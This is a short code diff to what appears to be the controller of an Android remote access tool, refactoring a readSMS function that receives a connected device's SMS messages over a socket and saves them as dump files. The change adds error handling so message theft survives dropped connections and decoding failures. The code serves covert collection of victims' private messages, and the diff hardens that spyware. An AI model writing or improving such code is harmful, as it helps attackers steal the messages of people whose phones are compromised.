@@ -131,22 +131,28 @@ def getImage(client):
     if flag == 1:
         os.remove(filename)
 
-def readSMS(client,data):
-    print(stdOutput("info")+"\033[0mGetting "+data+" SMS")
-    msg = "start"
+def readSMS(client, data):
+    print(stdOutput("info") + "\033[0mGetting " + data + " SMS")
     timestr = time.strftime("%Y%m%d-%H%M%S")
-    filename = "Dumps"+direc+data+"_"+timestr+'.txt'
-    flag =0
-    with open(filename, 'w',errors="ignore", encoding="utf-8") as txt:
-        msg = recvall(client)
-        try:
-            txt.write(msg)
-            print(stdOutput("success")+"Succesfully Saved in \033[1m\033[32m"+getpwd(filename)+"\n")
-        except UnicodeDecodeError:
-            flag = 1
-            print(stdOutput("error")+"Unable to decode the SMS\n")
+    filename = "Dumps" + direc + data + "_" + timestr + '.txt'
+    flag = 0
+
+    try:
+        with open(filename, 'w', errors="ignore", encoding="utf-8") as txt:
+            msg = recvall(client)  # Attempt to receive SMS data from the client
+            txt.write(msg)  # Write the received data to the file
+            print(stdOutput("success") + "Successfully Saved in \033[1m\033[32m" + getpwd(filename) + "\n")
+    except ConnectionResetError:
+        print(stdOutput("error") + "Connection was reset by the client. Unable to read SMS.")
+    except UnicodeDecodeError:
+        flag = 1
+        print(stdOutput("error") + "Unable to decode the SMS\n")
+    except Exception as e:
+        print(stdOutput("error") + f"An unexpected error occurred: {e}")
+
     if flag == 1:
-    	os.remove(filename)
+        if os.path.exists(filename):
+            os.remove(filename)  # Remove the file if it was created but not valid
 
 def getFile(filename,ext,data):
     fileData = "Dumps"+direc+filename+"."+ext
